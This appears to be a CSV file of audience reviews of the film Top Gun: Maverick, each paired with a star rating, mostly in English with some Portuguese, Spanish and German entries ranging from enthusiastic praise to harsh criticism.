"Even without seeing the original Top Gun film, the audience can feel the sense of nostalgia and excitement that our leads have to be back in their action-packed roles. Tom Cruise and Miles Teller are a dynamic duo in this long-awaited sequel. The beauty of the Top Gun movies lies in their ability to unite fans around the very simple purpose of routing for a courageous set of individuals. Without knowing who ""the enemy"" is, Top Gun Maverick still keeps you on the edge of your seat and into ""the danger zone"".",3.5
I went into this pleasantly surprised. They kept true to the original film far better than I expected they would. The cinematics are breathtaking at times and the filmography in dog fights are brilliant. Tom Cruise is... Tom Cruise. Personally never been a big fan but this is a cult classic.,3.5
So fricking good love the cast. The movie was 1000 times better than the first. Tom cruise is insane.,5
So so good. Everything a movie should be.,5
Didn't expect much. Turned out to be the greatest movie of 2022.,5
"Decent movie, but extremely predictable and underwhelming.",3
One of the best war movies I have ever seen.,4.5
"A roller coaster ride! Like Mission Impossible, but airplanes. Very entertaining!",5
"Top Gun: Maverick is an enjoyable, visually stunning ride that, unfortunately, lacks substance. Fans of the original Top Gun will appreciate the nostalgia factor, but generally, the movie fails to offer anything new or different from its predecessor.",4
"Honestly the best movie I have seen in the last 10 years! Got me back into the theater so fun, great acting, truly one of the best sequels ever made! 100 out of 100 top five best movies for me!",5
"As far as sequels goes, this movie does more than hold its own with the greatest sequels of all time. This movie does the original justice and yet at the same time does enough to have it be a standalone perfect movie to save theaters.",5
"An All Time Classic. The stunt work, practical effects, and camerawork is incredible with 90% of the effects being practical and very clean well done CGI. The soundtrack is just as phenomenal as the first. The acting fixes the problems of the first one by keeping Cruise humble but determined the whole way and never comes across as a jerk like the first. This also has engaging and likeable support characters and you slowly fall in love with the entire crew. This is a thrill ride the entire way that never lets up and is something everyone should see once and is a great reward for anyone who has already seen the first.",5
"Story is simple yet satisfying. The character of Maverick is handled with respect, while still providing some more insight into his fears and insecurities. Visually stunning! A good old blockbuster through and through.",5
An exciting movie filled with action and emotion. The quality of filmmaking for this movie is insane. Its immersive nature had me on the edge of my seat and ready to ride into the danger zone.,5
One of the very few sequels that outshines the original!,5
"The greatest movie ever made. The story of a guy making sure his guys and gals don't die in a huge mission, also trying to get back in touch with his relationship, and even trying to help his friends son. The ending was so amazing I cried so hard. This sequel was worth the wait after 36 years. Even the first part of the end credits didn't even make the people leave the theater. The song by Lady Gaga was a total fit for the entire movie. This movie teaches everyone that you can be your own hero inside.",5
I say it‚Äôs hard to make a sequel better than the first but this one comes DARN close. My only complaint was they didn‚Äôt figure out a way to include Kelly Mcgillis as Charlotte.,4.5
I had a lot of fun watching,5
Thank God for this movie. I think it was better than the original. Hollywood just can't seem to figure out what the audience wants but every now and then we get a gem like this. God bless Tom Cruise!!!,5
"8 shirtless beach sports scenes out of 10 Pros - Captivating from the opening scene. - Dogfight camera work is excellent. You feel like you're in the cockpit. - Much better script and a clearer plot progression make for a better overall movie than its predecessor. Cons - Like the previous one, it is a 2-hour advertisement for the Navy fighting against a nameless, ideology-less enemy. - Character development outside of the relationship between Maverick and Rooster is shallow. Characters are reduced to their closeups in slow motion action scenes.",4
Endlich wieder ein echter Actionfilm ohne nonsense.,5
Even with 36 years in between Tom Cruise still made one of the best movies in the past 10 years!,5
"Filme excelente, como nos velhos tempos. Sem frescura e sem viadagem, filme pra macho. Chupa lacradores + 1 Bilh√£o em bilheteria",5
It was so succulent.,5
I had seen the original many times before watching the new one . I waited more than 2 years for this one to come out and I Truely enjoyed it from start to finish . I felt their was more than a few scenes that were brilliant and Tom cruise right from the start was already at his best .,4.5
love it good job on the movie,5
"this movie will blow your mind, it makes you fell geat, I highly suggest this movie to everyone that is over 10",5
"Sometimes you just see a movie that seems raw and real, with a good story to boot, with a twist but not endless twists for the sake of it. this is it. no fake looking CGI here. Might be the best movie so far this decade.",5
ONE OF THE BEST ACTION MOVIE OF ALL TIME!,5
i had stopped believing in the power of cinema. I thought movie theatres are done. And then they made Maverick. Tom Cruise is an unstoppable force and this movie is a triumph!!,5
This movie is what movies should be -- fun. Tom Cruise did a great job; the story was engaging; and the movie didn't take itself too seriously. Highly recommended.,5
"Wow! I resisted watching this movie for a long time because tom cruise, as a person, is an unrelenting caricature of a fool, but the movie was actually really good. I still don't like tom cruise as a person though.",4
very very very very very good,5
Just awesome. Really recommend it.,5
Thank you to the people who made this happen!,5
We need more Movies like this one both Top Guns Exceptional!!!!!!!!!,5
"Have seen this movie three times now, and it keeps getting better!",5
"I've seen it in 4DX and IMAX, not to mention 2x in 2D and 2x on TV. Top Gun Maverick is definitely my favorite film in 22. I still did not receive enough awards IMOP. Stunning visuals, great performances, and cool characters. They were challenged to their limits by the mission. Combined with awesome F-14s and next generation fighters, this is a wild ride.",5
"I never knew I could feel so many emotions just watching planes fly through the air, and yet, here I am writing this review. One of my favourite media tropes is 'teamwork', I feel like it usually goes with the 'found family' trope which showcases a sense of loyalty, friendship, love and caring which are my absolute favourite things to see among a cast of characters. This movie is filled with that sort of comradery. That, and planes. Planes are cool. Flying's cool. 10/10 for the planes.",5
"Excelente pel√≠cula, volvi√≥ el cine, muy entretenida y nost√°lgica",5
"Wow, great movie! Maverick GO!",5
Saw this opening night in the Dolby cinema and it was absolutely incredible. One of the best movies I have ever seen. The cinematography was incredible and the audio was just chef's kiss. The story was amazing and had me on the edge of my seat the WHOLE time. I now own it on Amazon and I have seen this movie another 10 times haha. PLEASE go watch it.,5
"Great sequel to the original, which the original also holds up.",4
"Absolutely, hands down how a movie can be perfect in every way. It had romance, mystery, suspense, nostalgia, loophole free, comedy, all the emotions of a well done roller-coaster ride!! Excellence and morals still exist! Nothing but love for its viewers. Thank you so much for caring about your audience. It did not go unnoticed. Hope you enjoy a well deserved toast, you amazing people!",5
As close to perfect as a movie can be.,5
watched this movie countless of times. it's addicting and the soundtrack is great! definitely worth a watch!,5
Top Gun: Maverick is everything that anyone could ever want for a sequel to the original. It's fun and packed full of action!,4.5
Excellent movie! Really enjoyed this. Love the action as well.,5
long wait for the sequel but worth it!,5
√≥timo! h√° muito tempo n√£o via filme assim!,5
"This movie is 99.9% perfection ... and the worst nightmare for woke Hollywood. Thank you, Mr. Cruise.",5
"Excelente filme, tem inclus√£o coerente, ou seja as pessoas aparecem no roteiro pelas suas habilidades e n√£o por ser da ""minoria"" A ou B",5
"Great feel good America film, patriotic is alive again.",5
screen x was amazing for/with this movie. amazing,5
"Um retorno refrescante aos filmes de a√ß√£o, sem essa narrativa ma√ßante de identitarismo. Est√≥ria enxuta, com o carisma habitual de Ton Cruiser.",5
The best movie in 2022 ‚ù§Ô∏è,5
One of the most exciting movies ever!,5
OTIMO EXCELENTE ESSE FILME!!!,5
Best movie in a decade! That's all.,5
Absolutely loved every minute of this movie - this is what cinema is all about!,5
Excellent. A fun funny exciting film for all ages. Sad about Val but he brought it on himself and is lucky to be alive. While Tom cruise looks and acts phenomenally. This film is what avatar 2 wishes it was! We need films like this again and to get away from 6 hr streaming movies which suck. This is a proper film / cinema experience.,5
"A must see.I love Tom Cruise so much.I'm mighty impressed.A must-see.My favourite movie ever.As a Cruiser myself,I can tell it's perfect.",5
Classily good. Tom Cruise can effing play this role. The flying scenes and action are the best!,3.5
"Amo esta pel√≠cula, la acci√≥n, la historia y los efectos de camara, adem√°s de su canci√≥n oficial interpretada por Lady Gaga. Mi puntuaci√≥n final es de 9.4/10",4.5
"Takes you from action to tension to emotion in a stellar example of the action genre. Brilliant: directing, acting, soundtrack and storyline creation come together to create a piece that far outshines the expectations usually given to sequels.",5
Enjoyed the first one & enjoyed this one more!,5
Just plain Awesome!!,5
"The amount of fun I had watching this masterpiece is indescribable. Great story, impeccable acting, wonderful soundtrack and memorable moments. Loved it.",4.5
perfect sequel to the original. easily rewatchable,5
Predictable but very entertaining!,5
"Outstanding movie! Didn't watch in theaters because was worried it wouldn't be as good as the first one. You never know with sequels, right? But I finally watched it at home and now can only hope it'll be back in theaters someday so I can get the full big screen experience. They did a wonderful job! Not only did it have all the nostalgia you'd expect, but also a fresh new story that really could've been a movie by itself without being a sequel. Highly recommend for those who loved the first one or for anyone who just want to enjoy a good movie. 5 stars all around!",5
Now this is what a movie should be like! Top Gun is TOP NOTCH!! Love the emotional weight and connections to the original. Well done üëç,5
Wow wildly overrated. Half the movie is close ups of pilots looking constipated going ggrrrrrooofff! Predictable scenes.,3
Very entertaining. Clean language. Watched it at least 10 times. Good humor and great actors. Loved it,5
"Cheesy? Silly? Boring? Poignant cause Val,",2
"Simply speechless to describe the immersion this film provides, it's unbelievable. Everything was well-crafted and well-thought-out. It's impressive that impactful films like this are still being produced nowadays. The awards received are fully deserved.",5
"One of the best movies I've have ever seen! References from the old movie, plus the old actors got together and played in this movie! This movie is what I call a masterpiece.",5
The first hour it's exactly the same as the original film. Ejecting from the test plane at that Mach would be like being run over by 100 steamrollers. Why did all the other fighter bombers need a navigator but Maverick didn't. What happened to Gooses sons co-pilot after he crashed. Pilots don't walk away from jet crashes unless they parachute out. A typical poor predictable sequel.,1
"I am always nervous with sequels of epic movies, but this did not disappoint! I have to say this is better than the 1st! Outstanding movie!!!",5
"Nice and well plotted, with Tom Cruise putting on a show, music to fit the vibe makes for a huge success.",5
An incredible feat of filmmaking. Arguably the best movie of the past decade.,5
"Just as good if not better than the first. Just kidding, not better than the first",5
Everything about this movie was great. Just Watch it.,5
Utterly predictable. Nothing special here,3
I missed Top Gun Maverick at the big screen so I just paid $14.99 to see it via Apple Movie. I'll gladly pay $50 for someone to come around and shoot me dead before it finishes. Fuck.,1
"This is a great movie that you can watch over and over again without getting bored. Visuals, sound effects, and the actors make it all look completely realistic and a lot of the time make you think everything on the screen is actually happening.",4
Amazing movie good plot better than the first movie,5
"If I'd never seen Top Gun this would have been a good movie on its own. As its a sequel its equally enjoyable as the original. Solid performances by all, enough nods to the original and the flying sequences are something special. In summary just watch it.",5
As good if not better than the original.,5
"I liked the movie, but it didn't have the same magic as the original",3
very good this film congratulations to the director of this work.,5
Totally unbelievable. A few good action scenes is all. Mostly soap opera drama,1.5
Great movie you wouldn't be disappointed,3.5
awesome movie! love it,5
"Maverick takes nearly all the right lessons from its 80s action predecessor, proving that period has plenty to teach contemporary film. Compared to the sprawling and oversaturated epics that currently dominate, Maverick is focused, gripping, and affective, trusting its premise to deliver the action, its cast to deliver in their performances, and its audience to connect to the emotional core of the narrative.",4.5
This movie was everything I thought it would be and I loved it. When I saw this movie in the Theater I was blown away with how good it was and how real it felt like as if you were in one of the planes itself. This movie was very entertaining.,5
A nice homage to the first. Enjoyable.,3.5
"Classic, very poignant end to the 2 part movie. Recommend",5
Feel like it won't be as good out of theaters but you know what you are gonna get. A solid movie.,3
This movie really has no right to be this good. Top Gun sucks. Top Gun: Maverick is a cinematic marvel,4
"I mean, it was a solid film. I wish that we were told who were the adversaries.",3.5
"It's a pretty good movie. Unlike the first one, there's more scene on new technology for jets, like the Darkstar and F35 at the beginning. Also a special details on enemy's this time. Unlike part one only jet, this time also with factory and jets.",5
Best Film wooooooooow,5
"A great movie, which delivers everything fans of the first movie could have hoped for.",5
Talk to me Goose. Enough said.,5
"Just got done watching, and I was completely blown away. Just wow. Thank you Tom Cruise.",5
Predictable nonsense! Virtually no story of merit. Very poor script written by a ten year old? The only redeeming feature was the ability of the next generation plane to about turn on a sixpence. Don't bother wasting your time,2
I like the Action drama and matching this second part with the first one,5
I don't know what all the hype was over this movie. Made no sense. The kids couldn't run the course because they weren't ready and than all of a sudden they could. New girlfriend with no explanation of what happened to the last one. The only thing I liked about this movie was Rooster.,2
Aun sin haber visto la primera me transmiti√≥ la nostalgia de alguna manera. Las escenas de acci√≥n y la m√∫sica emocionan much√≠simo.,5
Nonstop action. Great family movie.,5
"New pilots, same bravado. All the fun and excitement of the original. Tom Cruise finally embraces his (lack of) height and reminds us why he's Tom Cruise. Miles Teller finally feels tolerable. Really like their pairing. Solid script that keeps you on the edge of your seat with the help of good, fast editing. #Goose4eva.",4.5
The effort that went into this movie shows. Phenomenal movie!,5
"Really good movie. I loved the first one, I adored this one. Why did it take so long to make Top Gun Maverick. The second is as exciting as the first. Tom Cruise is as good as ever",5
Saw it in 4DX twice. The fact that they used actual US Navy pilots to take the actors and actresses up in the RIO seat and fly those amazing set pieces still blows me away.,5
"Absolutely amazing! They don't make them like this anymore. I watched it on 4DX at the cinema which was a lot of fun, then rewatched in the house and enjoyed it just as much. Will definitely be watching it again.",5
This sequel did not disappoint! Great mix of nostalgia and modern concepts without being too ‚Äúwoke‚Äù. Get yourself a beer with large popcorn and enjoy!,4.5
AMAZING MOVIE WITH A GREAT CAST.,5
"Absolutely outstanding. ‚ÄòTop Gun: Maverick' captures the spirit of the original whilst updating and improving on nearly every aspect including superbly thrilling dogfights and a better overall story that smartly links these new characters with those of the original for that extra dose of nostalgia and feels. This is the rare sequel -- hitting cinemas over 35 years later, no less ‚Äì that not only delivers, but entirely surpasses its predecessor and should please both new and old fans.",4.5
"One of the most exciting films and surprisingly creative, well paced films in the last few years. Full of real relationships, struggles of past redemptions with stellar energy and acting throughout. AN ABSOLUTE MUST SEE!",5
I did manage to watch the entire s-show. That was a mistake. Terrible.,1
"This movie was pretty good, the only thing is that it didn't have much of the action I would've wanted to see and didn't live to my expectations.",3
Simplesmente um novo cl√°ssico que surge! Sem defeitos,5
"watched it 3 times so far.. just gets better every time.. even caught a new reference i missed in the first 2 views.. its about as awesome an action flick as it gets.. just see it.. if you like ANY action at all, just go see it.. its one of the best in years..",5
"Kind've a better version of the first movie, but also a great sequel.",5
Fantastic Sequel potential to be a future classic!,5
dont mess with the top gun,5
This movie is EPIC! The scenes are so good! Putting actual cameras in the planes makes it feel do real! Love This movie!!,5
"Refreshing. First movie to come out in years that seemed made for men instead of demonizing them. The characters ride motor bikes, have pretty love interests, & like dogfighting plane battles. It's nothing groundbreaking, but a good summer blockbuster considering today's film climate. In decades past it would've been like a 78 out of 100 type grade (like a normal, fun, testosterone-filled, summer blockbuster) but I think the recent heavy-handed nature of Hollywood's political & social themes that incessantly gets injected into scripts...I think that climate subconsciously might make viewers feel refreshed after seeing a movie like this. The political topics you expect to be forcefully injected into the script or the social themes you expect to be forcefully projected onto the main characters, aren't there. It's literally the definition of K.I.S.S. ('keep it simple stupid'). Thus had it been made in 1960's - 2000s, we'd consider it average to above average summer blockbuster. Because it's made in 2022 however, I find myself giving it credit for the things it doesn't do more so than the things it does. Worth a watch especially for older male audiences.",3.5
"It's good fun, but total Hollywood cheese. Good if you are folding laundry.",2.5
"Movie sounds mind-blowing on a finely-tuned home theater with Dolby Atmos Surround. You actually feel like you're inside one of those F/A-18's screaming through a tight mountain canyon. I just wish this film had more original music, which made the first movie so iconic. The Lady Gaga song moves my soul and touches my heart. It's a delicious feast for the eyes and ears!",5
"Top Gun Maverick √© incrivel, cenas de a√ß√£o fantasticas e supera muito o primeiro filme em quest√µes de historia, o filme trabalha muito bem a nostalgia do fan e passa cenas de ten√ß√£o e a√ß√£o que deixam o telespectador vidrado e pulando da cadeira, simplismente fantastico.",4
Start to finish : the movie is Amazing üòä,5
"I think it's great. The pace is quick and the plot is touching, background music matches the scenes a lot too",4.5
"Perfect Movie, Must watch. Emotion, Love, Friendship all in together.",5
Love it!!! Great movie!,5
"Of course it can't beat the original but kind of a let down regardless. It was full of cringy moments and the plot was very unrealistic. Why wouldn't they just send some drones? How many times did he milk the line ""talk to me goose""? Hugely over-rated",2.5
Highly ambitious & highly entertaining film. Great execution of how to make a blockbuster.,5
"It was a great movie with epic drama and epic scenes. They need to add more realism into it and take away the ridiculous stuff, other than that well done!",4.5
Good but y‚Äôall gassing,3
Perfect movie! We all loved every minute!,5
"Top Gun Maverick √© um filme maravilhoso, traz a nostalgia do primeiro e consegue ser bem melhor que seu antecessor, maravilhoso, me emocionei ao assistir.",5
Uhhh.. have you seen it?! It's the best military movie in yeeeaarsss.,5
"There's not much to say - it's just a perfectly solid 10/10 movie! With a perfect balance of action, down-time, a romantic sub-plot, fantastic score/cinematography and effective links to the first films (yet ones that don't alienate new viewers), Top Gun: Maverik is an all-round must see film for anyone!",5
A bad remake of the original.,1
Just watched it again at home. This the kind of movie that most people want to see. Take note Hollywoke.,5
"i feel like as a younger viewer the nostalgia doesn't really matter to me. however, Tom Cruise is still a madman and there's still quality scenes. I think the reviews made me want more but still a good film.",3
"This is what big screens are made for. A visceral thrill ride of emotional cliches, one liners and BS in the funnest way. Don't stop to ask how she got that car or that yacht working in a bar or how well you are being manipulated in every respect by the score, sound, romance or storyline - just enjoy its effect on you. As cheesy as a tom cruise cheek muscle flex but you wont care. Experience star wars - like dog fights, heart pumping scenes of impossible maneuvers cut as Tony Scott would have intended. Then exit the cinema and enlist in the Navy. Hang up your brains at the door and enjoy the total theatre of Top Gun Maverick.",5
"I gave it five stars because it was not really that woke. It was bad, but not completely woke. It appears that the writers believe everyone in the Navy is a complete jerk. It was painful to watch and cringy the majority of the time. I was expecting a great movie. It was not great, but because it was not completely woke and I was able to finish it within a week. Small doses is the best way to complete this movie. If you compare this movie to anything released in the last decade, it is great. If you lived through the 90's and know what an actual movie is suppose to be like, then you may be disappointed. Overall, it was not bad enough to watch as a sociological experiment to see how decayed our society is, however it was lame.",5
Modern but with the right classic. Great story and visuals. Simply a great watch.,5
A master piece! Thrilling. Would own the blue ray and watch many times.,5
Only thing wrong with this movie is that it isn't as nostalgic as the first.,5
This movie is so good! Never been this hype by an action movie üíØüíØüíØüíØ,5
I gave it 2 stars for the flying scenes but the movie plot was absurdly ridiculous. Couldn't stop laughing in parts ‚Äîdidn't realize this was a comedy! More outrageous than any disaster film.,2
"Just an ok movie to me. Adventure-packed for sure. Great acting. But plot is lacking. It's basically about some navy or army pilots who have a mission to go on to drop bombs on a toxic area, and for the entire movie they basically practice flying the course and then carry out the mission. That's it.",3
"Top Gun: Maverick is an action-packed blast with some incredible visuals and an inspiring, if predictable, storyline. The flying scenes look and sound so much better than the original and third-act action is a welcome addition to the franchise. The film does an excellent job of calling back to the original while bringing in new and exciting characters. Probably the best legacy sequel of all time!",4.5
"Beautiful looking, perfectly fine movie. It hit every character, plot point and trope that it should have. Nothing new. Nothing original or unique. The same band of character prototypes as any military based film. Same plot points that nicely map out achieved goals and hard fought redemption. A tad...not...boring, per say but...uneventful. The film achieved exactly what it was supposed to and nothing more.",3
Good movie. It had a nice build up and then didn't disappoint!,5
"One of the best movies I've ever seen. The graphics and effects were amazing. The story was inspiring, because it teaches that all things are possible despite of any obstacles. I can't remember the last time I seen a movie so good on all possible levels.",5
An excellent movie. A surprisingly good follow up to the original and a refreshingly good movie in a time of very poor-quality films.,4
"Very surprised I liked this movie, I did not like the first one, don't like Tom Cruise but thought I'd give it a chance. I liked it, was very exciting, tugged at your heart strings, lots of action and loved seeing Val Kilmer!!",3.5
"Without a doubt the best movie I've seen in years; certainly the best I've ever seen in theaters. I went to see it twice and I kept my ticket because it's just that special. A great plot, solid acting, and amazing ambiance. The film really makes you reminisce on the original and embodies the spirit of Top Gun without coming across as corny or tropy. It manages to capture all the best aspects of the original film 30 years later. Perhaps the very best of Tom Cruise. This film single handedly revived theatrical release. It's rare for the audience score to be a 99 but for the critics to also rate it over 90‚Ä¶that's nearly unheard of. This movie makes you proud to be an American. It's a beautiful testament to those who risk their lives to protect Her and all of us. It's exciting, it's touching, it's honest, and it's heartfelt.",5
The best Movie in 2022. Amazing experience.,5
"It doesn't get more contrived and predictable than this in america folks. Cardboard plot, low stakes action. American narcissistic circle jerk nominated for best picture, in case you still thought the Oscars were relevant. How much was Rotten Tomatoes paid for this review?",1
"I was expecting an entertaining movie but what I got was an awesome, edge of your seat, exciting adventure with the perfect cast. I watched most of the movies up for awards recently and, as good as some were, this was the most, again, entertaining and exciting of all of them. Welcome back Maverick and thank you Tom Cruise.",5
"Seeing the original Top Gun for the first time before seeing Maverick made this all the better. This reminds me of what movies can be, but often aren't these days, ENTERTAINING!",5
One of the best movies I've seen in years.,5
"A rare sight, a sequel better than the original. This movie shines at everything to the music, the action scenes, the characters the list could go on forever. I have no words for how amazing this movie is you just have to see it yourself.",5
They say imitation is the highest form of flattery ü§∑üèª‚Äç‚ôÇÔ∏è,3
After all the fabulous reviews I couldn't wait to see this film. What a disappointment. Absolute drivel.,1
INCREDIBLEEEEE! OMGGG! TOM CRUISE IS THE GOAT IN THIS MOVIE! GREAT GREAT MOVIE! THANKS,5
"When Top Gun Maverick was released it was an absolute edge of your seat thriller when seen in IMAX! The movie was fluid from start to finish, never a dull moment. Outstanding! The movie is addictive. It can't be seen only once!",5
"I was pleasantly surprised at how they tied this movie back to the original without it becoming a typical redo. There were several key plays on the past that I enjoyed, such as Maverick's introduction to his class. It brought some finality to unresolved issues from the original movie and carried its own story. Like Cruise or not, he was excellent. The mission was straight out of Star Wars V, but I am not sure many today would see that. It is a must-watch and worth the extra length of the movie.",5
"The movie owes most of its credit to the performance of the actors and special effects, it is completely predictable and domineering in some cases",3
"Cheezy dialogue, flat characters, boring romance.",1.5
It was a fun movie to watch but I was far from blown away. I don't know‚Ä¶. I guess some of the characters were just cheesy and cliched. It didn't feel original. Ultimately though the cast makes it worth watching.,3
This movie is the whole package. But a bit predictable.,4.5
Very predictable but the good flight action overcame the cheesiness.,3.5
Yep its a ripper! Flight scenes are stunning.,5
Was so skeptical when I heard the sequel is coming if the legend. Completely blew the first out of the water. Kept the nostalgia. Amazing.,5
Es lo que esperaba para el final de esta pel√≠cula y m√°s! Nostalgia y acci√≥n!,5
"Uma obra prima, n√£o tem como descrever de outra forma.",5
A perfect cinematic experience.,5
Beat expectations by a huge margin. It was a ton of fun watch. Wish I had seen it in theaters.,5
"this kind of movie that reminds us why do we love to see pictures in big screen. A truly immersive experience, action scenes seem real without the stupid CGI and the plot is interesting enough to enjoy the whole project.",4.5
"Nice. Not the Godfather, obviously, but it works, it move fast and you play along.",4
"Absolutely phenomenal, keeps you at the edge of your seat, very unpredictable, surprisingly amazing acting by the whole cast!",5
"I dont really like airforce movies but it was lowkey awesome, also love the soundtrack. Would watch again. 83.92/100",4.5
"This movie was 100% worth the very long wait. Was much better seen in Imax than a normal theater. The action, the sound and even the Music was pitch perfect. It build's up tension and then brings all the character arcs to a beautiful close.",5
It's probably my favourite movie of 2022 It was amazing tom cruise just delivered a blockbuster the movie as a whole was just perfect,5
"The best movie you could find in the theaters during 2022, truly phenomenal and inspiring. Bring back the meaning of being American!!",5
"A totally predictable trip down memory lane that shows the problem with movies now and 40 years ago. Like the original, this is an ordinary, yet exciting explosive film. It is so much like the original, but society is so starved for movie stars in action flicks that we all consider this to be a great film. Makes me sad. It is well made, but a complete Cruise vehicle. Miles Teller is the leader of the new bland aviators. Little character development overwhelms a visually enthralling experience. Final Score: 4.9/10",2.5
The best movie I‚Äôve seen in a very long time!!!,5
"Truly epic! With sick action scenes and dope visuals, the movie takes you on a rollercoaster of emotions. Tom Cruise kills it, and he's one of the few actors that can really take you on a journey both physically and emotionally. A story, with themes like friendship, love, and sacrifice that'll inspire you to be a better person. It's a modern cinema masterpiece, giving props to the writing, directing, and epic soundtrack. That's what makes this movie so special, it's not just about entertainment, it's about embodying those values that built our civilization and transforming your life for the better.",5
Simply incredible. Without that communist lacrosphere. Has the essence of true golden age blockbusters,5
"Wow‚Ä¶ just wow‚Ä¶ finally a movie with old fashioned seat of your pants entertainment. Absolutely loved it, this is what the movie experience is all about. We need more like this.",5
"Top Gun Maverick is an incredible film, not seen in a long time.",5
N√£o pensei que fosse gostar tanto de um filme de avi√£o. Ainda mais que esta √© uma continua√ß√£o de um filme qualquer coisa.,4.5
there were no movies like this,5
So refreshing to see a good movie amongst the movies nowadays I recommend 10/10,5
"Well Tom Cruise was at his best. The story is not the strong point here but the acting by the entire cast, the sound, the VFX, even the direction really takes the movie to the next level.",5
"It's a film that respects the original and improves upon it. Top Gun Maverick has a great script, visuals and sound. One of the best movies of 2022.",5
"Top Gun: Maverick is an adrenaline-fueled thrill ride that delivers on its promise to bring back the excitement of the 1986 classic. The plot of the film follows Maverick as he returns to the Top Gun academy as an instructor, where he meets a group of young pilots who are training for a dangerous mission involving a new stealth jet program. Among them is Lieutenant Bradley ""Rooster"" Bradshaw (Miles Teller), the son of Maverick's late friend and wingman Nick ""Goose"" Bradshaw. Maverick also rekindles his romance with Penny Benjamin (Jennifer Connelly), a single mother and bar owner who happens to be the daughter of his former commander. ""The movie features spectacular aerial sequences that will leave you breathless, with top-notch special effects that bring the action to life. The film delivers on its promise of exhilarating aerial action scenes, featuring stunning cinematography by Claudio Miranda and impressive practical effects that showcase Cruise's dedication to performing his own stunts. The film also pays homage to the original with references to iconic moments and characters, such as Val Kilmer's return as Admiral Tom ""Iceman"" Kazansky, Maverick's former rival turned friend."" That's why Tom Cruise once again proves that he is one of the most iconic action stars of all time, bringing a level of intensity and nuance to his performance that will leave you on the edge of your seat. The supporting cast is equally impressive, with standout performances from Jennifer Connelly and Miles Teller."" The film's score, composed by Harold Faltermeyer, is a nostalgic throwback to the original that is sure to get your heart racing. The editing is sharp, maintaining a steady pace that keeps the action flowing and never feels stale. Overall, Top Gun: Maverick is a triumph of filmmaking that will thrill audiences of all ages. It's a fitting tribute to the original and a testament to the enduring power of the franchise. Whether you're a fan of the original or new to the world of Top Gun, this movie is a must-see. I highly recommend it!",5
amazing movie from start to finish congrats tom,5
"Excellent movie. The story is fascinating, the actors are very good and the visual effects are breathtaking. This movie shows that cast representation doesn't have to get in the way of the story and leave the movie boring. I've seen it twice and I highly recommend it!",5
Exciting action and a better story than its predecessor,3.5
"This was the best overall film of 2022. A call back to the action films of old, Top Gun 2 has a healthy touch of everything. An emotional script, amazing stunt work with real aircraft, and a commanding performance from Cruise, this film was everything a fan could want in a sequel. This movie proves that entertainment is still possible and that the movie going experience is not dead yet.",4.5
Best action movie ever! Even better than the original!!! Totally made for the theater!,5
The blockbuster we needed after the pandemic!!!!,5
"Much better than the original. Better acting, and the better shots, and better story.",4.5
You couldn't ask for more from a sequel to this classic 80's movie. The style and nostalgia are laid on thick here; and it absolutely works. Does it make sense? Not really. Does it matter? Absolutely not. Don't think. Just do.,4.5
Incredible. Best sequel/remake out there. Goosebumps just thinking about it. Tom Cruise is the king,5
This is everything the Star Wars sequels should of been but weren't. It has a fantastic approach to legacy characters and treats both them and its audience with respect. This is the template and standard for legacy sequels. Hollywood actually giving its audience what they want instead of trying to talk down to them and insult them.,5
"I was never that into the original Top Gun, but I thought this one was great.",5
"Great film, better than the original one",4
"Excelente pel√≠cula, Tom Cruise nunca decepciona",5
One of the best movies I have seen in a while.,4.5
"I read movie critic reviews about Top Gun: Maverick, that the movie signifies the end of America, negative comments on aging, and that it promotes war. I disagree with these critics as I felt that the movie showed that despite technology, that it ultimately comes down to the individual. That one with experience is not used up, but can teach others, and pull G's with the best of them. It does not promote war, but instead shows the importance of having a strong defense, as history does repeat itself. Because of individuals who are willing to defend our country, at the risk of their own lives, America is not ending but is continuing to fight for democracy. Others who saw the movie with me all commented that it was even better than they were expecting.",5
Better than the first. Way exceeded my expectations.,5
Predictable and cheesy.,1
"A rare, amazing sequel! Well done!",5
not a fan of action movies. but development of the typical storyline was interesting and catchy.,3.5
"It's hard to make a perfect film, but this is as close as it gets. Incredibly fun sequel that leaves the original in its jet wash.",5
Spectacular! Best movie of the year.,5
"Suspenseful with a fantastic storyline. Nice to see how they brought back Val Kilmer. Excellent acting, stunts and special effects. Great morals to the story. It had everything and I just loved it. A movie that you would go see again and again. Note I saw this at the theater and Tom Cruise was correct, it's a must see theater movie!",5
Bad visual effects felt really forced and felt like it only excited to make money.,0.5
"Best movie of 2022. Phenomenal acting, amazing action sequences, breathtaking visual effects, and well crafted and inspiring continuation of the Top Gun story!",5
"Solid flick, good action, great scenes. Unfortunately, my knowledge of military stuff makes some (ok, a lot...) of it nonsensical. But what the hey!? It is a fun movie and the good guys win without guilt this time. Saw it twice, will likely see it again. Nice.",4
Can't fault this https://uberscaryblog.blogspot.com/2023/01/maybe-so-sir-but-not-today.html,4.5
"Excellent remake of 633 Squadron, albeit the Resistance plan to take out the air defences has been removed.",4
"Best movie ever! It has action, drama, comedy, and the story is fantastic. The flight scenes are like nothing we've seen before!",5
"It was predictable, and had some typical movie tropes. But it was well executed. Fantastic musical score and feel-good movie. This is the reason we go to the theaters!",5
Flawless. Absolutely amazing!,5
Classic continuation ‚ù§Ô∏è,5
It was over hyped and overacted.,1
One word masterpiece,5
The best sequel to the best movie of all time.,5
"Plot is predictable and plays off old plot line, ie motor cycle ride, gratuitous beach sports cense, old music. I was expecting more. Hard for me to watch since I'm not a Cruise fan. Loved the Navy carrier scenes. They should have just called it Top Gun - The Search for More Money.",1
It's more the nostalgia that made people think this was a masterpiece. It's not a Bad movie but its far from being a masterpiece.,3
"While a regurgitation of the original film's troupes and sentiments, and an extreme stretch of plausibility, the film keeps you on enough edge to eat your popcorn and cheer it on.",3.5
Kept my attention the entire movie,4
"Excelente! N√£o est√£o presentes as limita√ß√µes comuns dos filmes comuns, e nem est√° preocupado com bobagens ideol√≥gicas.",5
"I've watched all of the Oscar nominated movies with the exception of Women Talking. None, I repeat none, are in the same league as TG-Maverick. You combine both critic and audiences' ratings, TG-Maverick wins hands down. The only other movie with the same critic score is The Banshees. Will it win? Of course not. The 9500+ elitists voting won't give it a chance. It's a travesty. Precisely why I, as well as most everyday kind of ""folk"" will not watch. It will be another ratings disaster as usual. Top Gun Maverick is the best, hands down. Ce la vie....",5
Loved all of it!!!!!!!,5
"A love letter to aviation. This movie is visually beautiful and has steady and confident pacing rarely seen in high-flying action movies. This movie is more atmospheric than plot driven, but it delivers on that in a spectacular fashion.",4
